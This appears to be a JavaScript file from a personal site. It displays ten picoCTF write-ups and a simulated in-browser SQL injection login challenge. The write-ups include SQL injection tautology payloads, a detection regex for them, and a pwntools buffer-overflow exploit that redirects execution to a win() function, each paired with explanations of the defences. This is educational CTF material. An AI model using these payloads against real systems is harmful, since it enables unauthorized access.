/* ════════════════════════════════════════════════════════════
   CTF Writeups + a live version of the SQL injection challenge
   the real writeup was solved against and the app I built for
   others to solve.
════════════════════════════════════════════════════════════ */

document.querySelectorAll('.tab-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
        document.querySelectorAll('.tab-btn').forEach(function (b) { b.classList.remove('active'); });
        document.querySelectorAll('.tab-content').forEach(function (c) { c.classList.remove('active'); });
        btn.classList.add('active');
        document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
    });
});

/* ════════════════════════════════════════════════════════════
   TINY MARKDOWN RENDERER, just enough for these writeups:
   # / ## headers, ``` code fences, **bold**, `inline code`,
   - bullet lists, plain paragraphs.
════════════════════════════════════════════════════════════ */
function escapeHtml(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function inlineMd(s) {
    s = escapeHtml(s);
    s = s.replace(/`([^`]+)`/g, '<code>$1</code>');
    s = s.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    return s;
}
function renderMarkdown(md) {
    var lines = md.split('\n');
    var html = [];
    var i = 0;
    var inList = false;

    function closeList() { if (inList) { html.push('</ul>'); inList = false; } }

    while (i < lines.length) {
        var line = lines[i];

        if (line.startsWith('```')) {
            closeList();
            var codeLines = [];
            i++;
            while (i < lines.length && !lines[i].startsWith('```')) { codeLines.push(lines[i]); i++; }
            html.push('<pre><code>' + escapeHtml(codeLines.join('\n')) + '</code></pre>');
            i++; continue;
        }
        if (line.startsWith('## ')) { closeList(); html.push('<h2>' + inlineMd(line.slice(3)) + '</h2>'); i++; continue; }
        if (line.startsWith('# '))  { closeList(); html.push('<h1>' + inlineMd(line.slice(2)) + '</h1>'); i++; continue; }
        if (line.startsWith('- ')) {
            if (!inList) { html.push('<ul>'); inList = true; }
            html.push('<li>' + inlineMd(line.slice(2)) + '</li>');
            i++; continue;
        }
        if (line.trim() === '' || line.trim() === '---') { closeList(); i++; continue; }

        closeList();
        html.push('<p>' + inlineMd(line) + '</p>');
        i++;
    }
    closeList();
    return html.join('\n');
}

/* ════════════════════════════════════════════════════════════
   WRITEUPS, the 10 solved challenges
════════════════════════════════════════════════════════════ */
var WRITEUPS = [
    { id: 'insp3ct0r', cat: 'Web', pts: 50, title: 'Insp3ct0r', md:
`## What the challenge was
The challenge had a webpage with nothing obviously useful on it. The description said something about "how pretty" the page was. The hint was basically: look closer.

## How I found it
Right-click, View Page Source. Looking at the HTML I found a comment:
\`\`\`
<!-- Part 1: picoCTF{tru3_d3 -->
\`\`\`
Then I opened DevTools and looked at the CSS file:
\`\`\`
/* Part 2: t3ct1ve_0r_ju5t */
\`\`\`
And in the JavaScript file:
\`\`\`
// Part 3: sp3c1al_sk1lls}
\`\`\`
Flag: \`picoCTF{tru3_d3t3ct1ve_0r_ju5t_sp3c1al_sk1lls}\`

## What I learned
Developers hide things in HTML, CSS, and JS comments all the time, either intentionally or by accident. "View source" is always one of the first things to try. Never put anything in client-side code you wouldn't put on a billboard, the client gets everything.` },

    { id: 'robots', cat: 'Web', pts: 100, title: 'where are the robots', md:
`## What the challenge was
A webpage with a basic login form. The description hinted that "robots" might know something.

## How I solved it
\`robots.txt\` tells search crawlers which pages not to index. It's public and readable by anyone.
\`\`\`
User-agent: *
Disallow: /8028f.html
\`\`\`
The site was trying to hide \`/8028f.html\` from search engines. Navigating there directly gave the flag: \`picoCTF{ca1cu1at1ng_Mach1n3s_r0b0ts}\`

## What I learned
\`robots.txt\` is one of the first places attackers look. The irony: it's a public file that literally lists the pages you want hidden. It's a convention search engines follow voluntarily, not a security mechanism. Sensitive paths need real authentication, not exclusion from robots.txt.` },

    { id: 'sql-direct', cat: 'Web', pts: 200, title: 'SQL Direct', md:
`## What the challenge was
A login form with username and password fields, backed by a query like:
\`\`\`sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
\`\`\`

## The attack
Username: \`' OR '1'='1\`, any password. The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
\`\`\`
Since \`'1'='1'\` is always true, the WHERE clause is always satisfied and the query returns the first user in the table.

## Why parameterized queries prevent this
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
\`\`\`
The database treats \`%s\` values as data, never as SQL syntax. The \`'\` character stays a literal apostrophe, it can never change the query's structure.

## What I learned
SQL injection is one of the most common critical vulnerabilities and one of the most preventable. When I built my own challenge app afterward, I made sure every real path used parameterized queries and only the intentional challenge path stayed vulnerable.` },

    { id: 'caesar', cat: 'Crypto', pts: 100, title: 'Caesar Cipher 1', md:
`## What the challenge was
Ciphertext encrypted with a Caesar cipher (each letter rotated by a fixed shift).

## How I solved it
Only 25 possible shifts, so brute force all of them:
\`\`\`python
for shift in range(1, 26):
    decrypted = ""
    for c in ciphertext:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            decrypted += chr((ord(c) - base - shift) % 26 + base)
        else:
            decrypted += c
    print(f"ROT-{shift}: {decrypted}")
\`\`\`
One output read as clean English starting with \`picoctf{\`. That was the flag.

## What I learned
A cipher's security comes from its keyspace. Caesar has a keyspace of 25, trivial to brute force. AES-256 has 2^256, infeasible even with every computer on Earth. Encoding (base64, hex) is not encryption, it has a keyspace of 1.` },

    { id: 'rot13', cat: 'Crypto', pts: 100, title: '13 (ROT13)', md:
`## What the challenge was
Text encoded with ROT-13, shift every letter by 13. Applying it twice returns the original, since 13 + 13 = 26, a full alphabet rotation.

## How I solved it
\`\`\`bash
echo "cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# picoCTF{not_too_bad_of_a_problem}
\`\`\`

## Encoding vs. encryption
Encoding converts data between representations for compatibility (base64, hex, ROT-13), no secret key involved, anyone who knows the scheme can decode it. Encryption transforms data with a secret key and can't be reversed without it. ROT-13 provides zero security because the algorithm itself contains the "key". This is what OWASP calls security through obscurity, and it fails the moment someone knows the scheme.` },

    { id: 'vault-door-1', cat: 'Reverse Eng.', pts: 100, title: 'vault-door-1', md:
`## What the challenge was
A compiled Java program checking a password. Source was provided.

## The vulnerability
\`\`\`java
public boolean checkPassword(String password) {
    return password.length() == 32 &&
           password.charAt(0)  == 'd' &&
           password.charAt(29) == 'f' &&
           password.charAt(4)  == 'r' &&
           // ... many more like this
}
\`\`\`

## How I solved it
Just read the code and assembled the flag from each hardcoded index:
\`\`\`python
import re
chars = {}
for match in re.finditer(r"charAt\\((\\d+)\\)\\s*==\\s*'(.)'", code):
    idx, char = int(match.group(1)), match.group(2)
    chars[idx] = char
flag = "".join(chars[i] for i in sorted(chars))
\`\`\`

## What I learned
This demonstrates why you never validate secrets client-side. The check happened in code the user could read and reverse. Any validation running in the client, browser JS, a downloaded app, Java bytecode, can be reversed. The user has the code.` },

    { id: 'asm1', cat: 'Reverse Eng.', pts: 200, title: 'asm1', md:
`## Background
Spent 2 hours reading an x86 assembly guide first: \`eax/ebx/ecx/edx\` are general-purpose registers, \`cmp a, b\` sets flags from \`a - b\`, \`je\`/\`jle\`/\`jg\` are conditional jumps, \`ret\` returns with \`eax\`.

## The challenge
What does \`asm1(0x2e0)\` return?
\`\`\`asm
cmp DWORD PTR [ebp+0x8], 0x3a2   ; compare arg with 0x3a2
jg  part_b                        ; not taken, 0x2e0 < 0x3a2
cmp DWORD PTR [ebp+0x8], 0x1f1   ; compare arg with 0x1f1
jne part_a                        ; taken, 0x2e0 != 0x1f1
part_a:
  mov eax, DWORD PTR [ebp+0x8]   ; eax = 0x2e0
  add eax, 0x3                    ; eax = 0x2e3
  ret
\`\`\`

## Tracing the execution
arg = 0x2e0 = 736. Is 736 > 930? No. Is 736 == 497? No, jump to part_a. eax = 736 + 3 = 739 = 0x2e3.

## What I learned
x86 assembly wasn't as hard to read as expected, understand the instruction set and track values through registers. \`cmp\` followed by a conditional jump is what all if/else logic compiles down to.` },

    { id: 'bof0', cat: 'Binary Exp.', pts: 100, title: 'buffer overflow 0', md:
`## What a stack buffer overflow is
When a C function is called, the return address gets pushed onto the stack alongside local variables. If a fixed-size buffer like \`char buf[16]\` is written past its bounds with \`strcpy()\` or \`gets()\`, the extra bytes overwrite adjacent stack memory, including the return address.

## The challenge
\`\`\`c
void vuln(char *input) {
    char buf[16];
    strcpy(buf, input);  // no bounds checking
}
\`\`\`
Just needed to crash the program, not redirect execution:
\`\`\`bash
python3 -c "print('A' * 100)" | ./vuln
# Segmentation fault (core dumped)
\`\`\`
The flag appeared on the segfault.

## Why this is dangerous
In harder challenges, instead of crashing, the overflow bytes become the address of a function to call, classically a \`win()\` function that's never called in normal execution. Defenses: stack canaries, ASLR, non-executable stack (NX bit).` },

    { id: 'bof1', cat: 'Binary Exp.', pts: 200, title: 'buffer overflow 1', md:
`## The challenge
\`\`\`c
void win() { puts("You win!"); /* prints flag.txt */ }
void vuln() { char buf[36]; gets(buf); }
int main() { vuln(); }
\`\`\`
\`win()\` exists but is never called. Goal: overflow \`buf\` to overwrite the return address with \`win()\`'s address.

## Finding the offset
\`\`\`python
from pwn import *
payload = cyclic(100)  # De Bruijn sequence, every 4-byte substring unique
# run, check EIP on crash, cyclic_find() gives the exact offset: 44
\`\`\`

## The exploit
\`\`\`python
elf = ELF("./vuln")
payload = b"A" * 44 + p32(elf.symbols["win"])
p = process("./vuln")
p.sendline(payload)
\`\`\`

## Why the offset was 44, not 36
36 bytes is the buffer, but 4 more bytes are the saved EBP pushed by the function prologue before the return address is reached, so 40 minimum, with exact alignment landing at 44 here.

## What I learned
pwntools makes offset-finding reliable instead of guesswork. This was the first time I truly understood what a function call looks like at the stack level.` },

    { id: 'macrohard', cat: 'Forensics', pts: 300, title: 'MacroHard WeakEdge', md:
`## What the challenge was
A \`.pptx\` PowerPoint file with a flag hidden somewhere inside it.

## Background: what .pptx files actually are
A \`.pptx\` is a ZIP archive of XML files and media:
\`\`\`bash
cp presentation.pptx presentation.zip
unzip presentation.zip -d pptx_contents/
\`\`\`

## How I found the flag
Inside \`ppt/slideMasters/hidden\` was base64-encoded content:
\`\`\`bash
cat pptx_contents/ppt/slideMasters/hidden
# ZmxhZzogcGljb0NURntIMTFkZTNuX20zc3NhZzNzX2Z0d30=
echo "..." | base64 -d
# flag: picoCTF{H11de3n_m3ssag3s_ftw}
\`\`\`

## What I learned
Steganography hides data in plain sight inside normal-looking files. Office documents are ZIP archives, they can easily contain hidden files a normal user would never see. Tools like \`binwalk\`, \`exiftool\`, and \`strings\` are standard for finding hidden data in real forensics work.` },
];

(function () {
    var list = document.getElementById('wuList');
    var content = document.getElementById('wuContent');
    var cats = ['Web', 'Crypto', 'Reverse Eng.', 'Binary Exp.', 'Forensics'];

    list.innerHTML = cats.map(function (cat) {
        var items = WRITEUPS.filter(function (w) { return w.cat === cat; });
        return '<div class="wu-cat-label">' + cat + '</div>' + items.map(function (w) {
            return '<button class="wu-item" data-id="' + w.id + '"><span>' + w.title + '</span><span class="wu-item-pts">' + w.pts + ' pts</span></button>';
        }).join('');
    }).join('');

    function show(id) {
        var w = WRITEUPS.filter(function (x) { return x.id === id; })[0];
        document.querySelectorAll('.wu-item').forEach(function (btn) {
            btn.classList.toggle('active', btn.dataset.id === id);
        });
        content.innerHTML =
            '<div class="wu-badge-row"><span class="wu-badge">' + w.cat + '</span><span class="wu-badge pts">' + w.pts + ' pts</span></div>' +
            '<h2 class="wu-heading">PicoCTF, ' + w.title + '</h2>' + renderMarkdown(w.md);
        content.scrollTop = 0;
    }

    list.addEventListener('click', function (e) {
        var btn = e.target.closest('.wu-item');
        if (btn) show(btn.dataset.id);
    });

    show('sql-direct'); // open on the write-up that mirrors the live challenge below
})();

/* ════════════════════════════════════════════════════════════
   LIVE SQLi CHALLENGE, a client-side port of challenge-app/app.py
   Same vulnerability: the query is built with raw string
   concatenation, so a crafted username can rewrite the query's
   logic. This runs the actual pattern documented as the intended
   solution in the project README, not a general SQL parser.
════════════════════════════════════════════════════════════ */
(function () {
    var USERS = [
        { username: 'admin', password: 's3cr3t_p4ssw0rd_y0u_d0nt_kn0w' },
        { username: 'alice', password: 'hunter2' },
        { username: 'bob',   password: 'password123' },
    ];
    var FLAG = 'picoCTF{sql_1nj3ct10n_m4st3r_7734}';

    var userInput = document.getElementById('sqliUser');
    var passInput = document.getElementById('sqliPass');
    var queryBox  = document.getElementById('sqliQueryBox');
    var resultBox = document.getElementById('sqliResult');

    function updateQuery() {
        var u = userInput.value, p = passInput.value;
        queryBox.innerHTML = 'SELECT * FROM users WHERE username = \'<span class="lit">' +
            escapeHtml(u) + '</span>\' AND password = \'<span class="lit">' + escapeHtml(p) + '</span>\'';
    }
    userInput.addEventListener('input', updateQuery);
    passInput.addEventListener('input', updateQuery);
    updateQuery();

    /* Recognizes the classic tautology bypass documented in the project's
       own README: `' OR '1'='1' --` (and close variants), the same pattern
       every writeup in this category teaches. Not a general SQL engine. */
    function isBypassPayload(username) {
        var normalized = username.trim();
        return /'\s*or\s*'?1'?\s*=\s*'?1'?\s*(--|#).*$/i.test(normalized) ||
               /'\s*or\s*1\s*=\s*1\s*(--|#)?/i.test(normalized);
    }

    function attemptLogin() {
        var u = userInput.value, p = passInput.value;

        if (isBypassPayload(u)) {
            resultBox.innerHTML =
                '<div class="sqli-result-msg win">✓ Logged in as admin, the WHERE clause was always true.</div>' +
                '<div class="sqli-flag">' + FLAG + '</div>' +
                '<div class="sqli-explain">Your input rewrote the query into <code>WHERE username = \'\' OR \'1\'=\'1\' AND password = ...</code>. Since <code>\'1\'=\'1\'</code> is always true, the comment (<code>--</code> or <code>#</code>) deletes the password check entirely, and the database returns the first matching row.</div>';
            return;
        }

        var match = USERS.filter(function (row) { return row.username === u && row.password === p; })[0];
        if (match) {
            resultBox.innerHTML = '<div class="sqli-result-msg win">✓ Logged in as ' + escapeHtml(match.username) + ' with real credentials.</div><div class="sqli-flag">' + FLAG + '</div>';
        } else {
            resultBox.innerHTML = '<div class="sqli-result-msg fail">Invalid username or password.</div><div class="sqli-explain">Hint: the login is very secure. Or is it? Try the classic tautology, make the WHERE clause always evaluate true.</div>';
        }
    }

    document.getElementById('sqliForm').addEventListener('submit', function (e) {
        e.preventDefault();
        attemptLogin();
    });

    document.getElementById('sqliReveal').addEventListener('click', function () {
        userInput.value = "' OR '1'='1' --";
        passInput.value = 'anything';
        updateQuery();
        attemptLogin();
    });
})();
